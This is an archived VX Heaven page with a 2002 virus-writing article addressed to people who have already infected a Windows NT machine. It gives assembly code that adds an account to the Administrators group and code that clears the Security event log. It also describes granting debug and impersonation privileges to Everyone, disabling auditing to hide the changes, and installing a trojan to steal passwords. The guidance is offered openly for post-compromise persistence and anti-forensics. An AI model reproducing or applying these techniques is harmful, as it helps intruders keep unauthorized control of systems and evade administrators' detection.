<?xml version="1.0"?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"><html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
<head>
<title> Ratter 'Opening NT boxes for you and your comrades in arms' (VX heaven)</title>
<meta http-equiv="content-type" content="text/html; charset=utf-8"/>
<meta name="Author" content="Ratter"/>
<meta name="KeyWords" lang="en" content="computer virus, virus, virii,vx, компьютерные вирусы, вирус, вири, Ratter,Opening NT boxes for you and your comrades in arms, push, event, auditing, security, call, machine, clearing, impersonation, taichi, system, disable, pushvar, steps, account, needed"/>
<meta name="Description" content="You have infected a NT box and you're runned under the administrators group member security context. Now you can do everything you want with the machine. How to make the machine open for you even if you log in as a normal user?"/>
<script type="text/javascript">
//<![CDATA[
try{if (!window.CloudFlare) {var CloudFlare=[{verbose:0,p:0,byc:0,owlid:"cf",bag2:1,mirage2:0,oracle:0,paths:{cloudflare:"/cdn-cgi/nexp/dok3v=1613a3a185/"},atok:"047a5bcbf67431883fc9ed25fba33612",petok:"f235ea78b53da04d37f51ed12474dabc6fd2bd7d-1498756896-1800",zone:"vxheaven.org",rocket:"a",apps:{}}];document.write('<script type="text/javascript" src="//ajax.cloudflare.com/cdn-cgi/nexp/dok3v=85b614c0f6/cloudflare.min.js"><'+'\/script>');}}catch(e){};
//]]>
</script>
<link rel="icon" href="/favicon.ico" type="image/x-icon"/>
<link rel="shortcut icon" href="/favicon.ico" type="image/x-icon"/>
<link rel="stylesheet" type="text/css" href="/style.css"/><link rel="canonical" href="http://vxheaven.org/lib/vra09.html"/>
<script type="text/rocketscript" data-rocketsrc="https://apis.google.com/js/plusone.js">{"parsetags": "explicit"}</script>
</head>
<body bgcolor="#dbc8a0" text="#302000" link="#225599" vlink="#113366">
<div class="s1">
<div style="float:right;"><a href="/lib/index.php?tbs=1"><img src="/img/max.gif" alt="Maximize"/></a></div> <form id="lf" style="margin: 0; float: right;" method="get" action="/index.php"><input type="hidden" name="action" value="set"/><select name="lang" onchange="javascript:document.getElementById('lf').submit();"><option value="ru">Русский</option><option selected="selected" value="en">English</option><option value="ua">Українська</option><option value="de">Deutsch</option><option value="es">Español</option><option value="fr">Fran&ccedil;ais</option><option value="it">Italiano</option><option value="pl">Polski</option></select></form>
<div style="float: right;"><div id="plusone"></div></div>
<script type="text/rocketscript">gapi.plusone.render("plusone", {"size":"small","count":"true"});</script>
<div style="float: right;" class="addthis_toolbox addthis_default_style">
<script type="text/rocketscript">var addthis_config = { ui_click: true }</script>
<a style="text-decoration: none; font-size: 10pt;" href="/?action=addthis" class="addthis_button_compact">Bookmark</a>
<script type="text/rocketscript" data-rocketsrc="http://s7.addthis.com/js/250/addthis_widget.js#username=herm1t"></script>
</div>
<div style="float: right;">
<script type="text/rocketscript" data-rocketsrc="http://www.google.com/cse/brand?form=cse-search-box&amp;lang=en"></script>
<form action="/search.php" id="cse-search-box">
<input type="hidden" name="cx" value="002577580816726040001:z9_irkorydo"/>
<input type="hidden" name="cof" value="FORID:10"/>
<input type="hidden" name="ie" value="UTF-8"/>
<input type="text" name="q" size="12" value=" "/>
<input type="submit" name="sa" value="Search"/>
</form>
</div><h1><a href="/" style="text-decoration: none; color: #000000;">VX Heaven</a></h1>
<span class="nav"><a href="/lib/">Library</a> <a href="/vl.php">Collection</a> <a href="/src.php">Sources</a> <a href="/vx.php?id=eidx">Engines</a> <a href="/vx.php?id=tidx">Constructors</a> <a href="/vx.php?id=sidx">Simulators</a> <a href="/vx.php?id=uidx">Utilities</a> <a href="/links.php">Links</a> <a href="/donate.php" style="color: #706020" id="donate">Donate</a> <a href="/forum" style="text-decoration: underline;">Forum</a> </span><br clear="all"/>
</div>
<div class="s2"><h1>Opening NT boxes for you and your comrades in arms</h1><p><a href="/lib/?lang=en&amp;author=Ratter"> Ratter</a><br/> <em><a href="/vx.php?fid=11#f11">29a [6]</a></em><br/> <em>March 2002</em></p><script type="text/rocketscript">var disqus_url = 'http://vxheaven.org/lib/vra09.html';</script>[<a style="" href="/lib/?lang=EN&amp;index=WI#vra09">Back to index</a>] [<a href="/lib/vra09.html#disqus_thread">Comments</a>]<br/> 
<ul>
<li><a href="#c1">Intro</a></li>
<li><a href="#c2">Adding to administrators group</a></li>
<li><a href="#c3">Adding needed privileges for Impersonation/Debug mode</a></li>
<li><a href="#c4">Disabling auditing</a></li>
<li><a href="#c5">Clearing the security event log</a></li>
<li><a href="#c6">Closing</a></li>
</ul>
<h2><a name="c1"></a>Intro</h2>
<p>You have infected a NT box and you're runned under the administrators group member security context. Now you can do everything you want with the machine. How to make the machine open for you even if you log in as a normal user?</p>
<h2><a name="c2"></a>Adding to administrators group</h2>
<p>Of course you can add now every account to administrators group. It's probably the easiest way to achieve the full control of the machine everytime your virus is runned. However this is not very "stealth" because even the stupidiest admin worx with accounts and almost for sure will see it.</p>
<p><em>Adding account to an administrators group</em></p>
<div class="asm" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: black; font-style: italic;">; Apis are exported by advapi32.dll and netapi32.dll</span><br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; domain_name_buffer&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">db</span>&nbsp; &nbsp; &nbsp; <span style="color: #ff0000;">100</span> dup<span style="color: black;">&#40;</span>?<span style="color: black;">&#41;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; sid_buffer&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">db</span>&nbsp; &nbsp; &nbsp; <span style="color: #ff0000;">30</span> dup<span style="color: black;">&#40;</span>?<span style="color: black;">&#41;</span><br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; @pushvar &lt;<span style="color: #0000ff; font-weight: bold;">dd</span>&nbsp; &nbsp; ?&gt;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; SID_type</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; @pushvar &lt;<span style="color: #0000ff; font-weight: bold;">dd</span>&nbsp; &nbsp; <span style="color: #ff0000;">100</span>&gt;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; domain_name_buffer size</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span> offset domain_name_buffer&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; domain_name</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; @pushvar &lt;<span style="color: #0000ff; font-weight: bold;">dd</span>&nbsp; &nbsp; <span style="color: #ff0000;">30</span>&gt; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; sid_buffer size</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span> offset sid_buffer&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; on output - sid</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; @pushsz <span style="color: #7f007f;">&quot;account&quot;</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; account name</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span> <span style="color: #ff0000;">0</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; system name - null is local system</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; calle LookupAccountNameA<br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span> <span style="color: #ff0000;">1</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; one entry</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; @pushvar &lt;<span style="color: #0000ff; font-weight: bold;">dd</span>&nbsp; &nbsp; offset sid_buffer&gt;&nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; entry buffer</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span> <span style="color: #ff0000;">0</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; entry type ...</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">call</span> <span style="color: #0000ff; font-weight: bold;">$</span><span style="color: #339933;">+</span><span style="color: #ff0000;">5</span><span style="color: #339933;">+</span><span style="color: #ff0000;">15</span><span style="color: #339933;">*</span><span style="color: #ff0000;">2</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; group name</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">dw</span>&nbsp; &nbsp; &nbsp; <span style="color: #7f007f;">&quot;a&quot;</span><span style="color: #339933;">,</span> <span style="color: #7f007f;">&quot;d&quot;</span><span style="color: #339933;">,</span> <span style="color: #7f007f;">&quot;m&quot;</span><span style="color: #339933;">,</span> <span style="color: #7f007f;">&quot;i&quot;</span><span style="color: #339933;">,</span> <span style="color: #7f007f;">&quot;n&quot;</span><span style="color: #339933;">,</span> <span style="color: #7f007f;">&quot;i&quot;</span><span style="color: #339933;">,</span> <span style="color: #7f007f;">&quot;s&quot;</span><span style="color: #339933;">,</span> <span style="color: #7f007f;">&quot;t&quot;</span><span style="color: #339933;">,</span> <span style="color: #7f007f;">&quot;r&quot;</span><span style="color: #339933;">,</span> <span style="color: #7f007f;">&quot;a&quot;</span><span style="color: #339933;">,</span> <span style="color: #7f007f;">&quot;t&quot;</span><span style="color: #339933;">,</span> <span style="color: #7f007f;">&quot;o&quot;</span><span style="color: #339933;">,</span> <span style="color: #7f007f;">&quot;r&quot;</span><span style="color: #339933;">,</span> <span style="color: #7f007f;">&quot;s&quot;</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">0</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span> <span style="color: #ff0000;">0</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; local system</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; calle NetLocalGroupAddMembers<br/>
&nbsp;</div>
<h2><a name="c3"></a>Adding needed privileges for Impersonation/Debug mode</h2>
<p>This approach is much more clever. I won't paste the code from TaiChi here in this case bacause it's too extensive so have a look to the source of Win2k.TaiChi function add_privilegez. What it does? First it gets the Everyone group SID and then adds both needed privileges to this group. SeTcbPrivilege for impersonation and SeDebugPrivilege for Win32 subsystem infection support.</p>
<p>You can of course combinate both. If you'll use impersonation to achieve full control then don't forget to install a trojan or find another way to retrieve passwords. However if you'll use only Debug support then possibly better idea is to modify the Global Flags because it's a little bit more "stealth" :) Or you can code a NT kernel mode driver which would via IOCTL on demand modify NtGlobalFlag variable to let you infect the protected components.</p>
<h2><a name="c4"></a>Disabling auditing</h2>
<p>If an admin is a good one has auditing on so those steps you did (adding privileges) got audited. It is good to disable auditing (see the function disable_auditing in TaiChi) so nothing gets logged ...</p>
<h2><a name="c5"></a>Clearing the security event log</h2>
<p>This is the log where auditing messages are stored. After you disable them it's good to clear this one. See code snippet:</p>
<p><em>Clearing the security event log</em></p>
<div class="asm" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: black; font-style: italic;">; Used apis are exported by advapi32.dll</span><br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #339933;">...</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; @pushsz <span style="color: #7f007f;">&quot;Security&quot;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">pop</span> <span style="color: #46aa03; font-weight: bold;">esi</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">call</span> clear_event_log<br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #339933;">...</span><br/>
<br/>
clear_event_log proc&nbsp; &nbsp; near<br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">pushad</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; @SEH_SetupFrame &lt;<span style="color: #00007f; font-weight: bold;">jmp</span> clear_event_log_end&gt;<br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span> <span style="color: #46aa03; font-weight: bold;">esi</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span> <span style="color: #ff0000;">0</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">call</span> <span style="color: #0000ff; font-weight: bold;">dword</span> ptr <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">ebp</span><span style="color: #339933;">+</span>tOpenEventLogA<span style="color: black;">&#93;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">test</span> <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">eax</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">jz</span> clear_event_log_end<br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">xchg</span> <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">ebx</span><br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span> <span style="color: #ff0000;">0</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span> <span style="color: #46aa03; font-weight: bold;">ebx</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">call</span> <span style="color: #0000ff; font-weight: bold;">dword</span> ptr <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">ebp</span><span style="color: #339933;">+</span>tClearEventLogA<span style="color: black;">&#93;</span><br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span> <span style="color: #46aa03; font-weight: bold;">ebx</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">call</span> <span style="color: #0000ff; font-weight: bold;">dword</span> ptr <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">ebp</span><span style="color: #339933;">+</span>tCloseEventLog<span style="color: black;">&#93;</span><br/>
clear_event_log_end<span style="color: #339933;">:</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; @SEH_RemoveFrame<br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">popad</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; retn<br/>
clear_event_log endp<br/>
&nbsp;</div>
<p>Although the message "Event log cleared" will appear, it will hide your previous steps and for the admin it will be harder to trace you. And of course this log can be cleared totally by using for example NTFS direct access.</p>
<h2><a name="c6"></a>Closing</h2>
<p>If you make these steps the NT box is opened for everyone. Once logged in you can do what you want. Even if you don't plan to write NT viruses at least add to your babes a code for adding SeDebugPrivilege to Everyone. Then it makes for another viruses easier to infect the machine - remember your fellow coders too :)))</p>
<div align="right">Ratter/29A - I'm a stranger in the world I haven't made</div>
<div id="disqus_thread"></div>
<script type="text/rocketscript">
        /* * * CONFIGURATION VARIABLES: EDIT BEFORE PASTING INTO YOUR WEBPAGE * * */
        var disqus_shortname = 'vxheaven'; // required: replace example with your forum shortname

        /* * * DON'T EDIT BELOW THIS LINE * * */
        (function() {
            var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
        })();
    </script>
<noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript></div>
<div><small>By accessing, viewing, downloading or otherwise using this content you agree to be bound by the <a href="/agreement.php">Terms of Use</a>!</small> <small>vxheaven.org aka vx.netlux.org</small></div>
<div style="margin-top: 2px; float: left;" class="adsapeu">
<script type="text/rocketscript">
<!--
var _acic={dataProvider:10};(function(){var e=document.createElement("script");e.type="text/javascript";e.async=true;e.src="//www.acint.net/aci.js";var t=document.getElementsByTagName("script")[0];t.parentNode.insertBefore(e,t)})()
//-->
</script>
</div>
<script data-rocketsrc="http://www.google-analytics.com/urchin.js" type="text/rocketscript"></script><script type="text/rocketscript">try { _uacct = "UA-590608-1"; urchinTracker(); } catch(err) {}</script>
<div style="display: none;"><a href="/lib/index.php?lang=de&amp;id=vra09">de</a><a href="/lib/index.php?lang=en&amp;id=vra09">en</a><a href="/lib/index.php?lang=es&amp;id=vra09">es</a><a href="/lib/index.php?lang=it&amp;id=vra09">it</a><a href="/lib/index.php?lang=fr&amp;id=vra09">fr</a><a href="/lib/index.php?lang=pl&amp;id=vra09">pl</a><a href="/lib/index.php?lang=ru&amp;id=vra09">ru</a><a href="/lib/index.php?lang=ua&amp;id=vra09">ua</a></div>
</body>
</html>
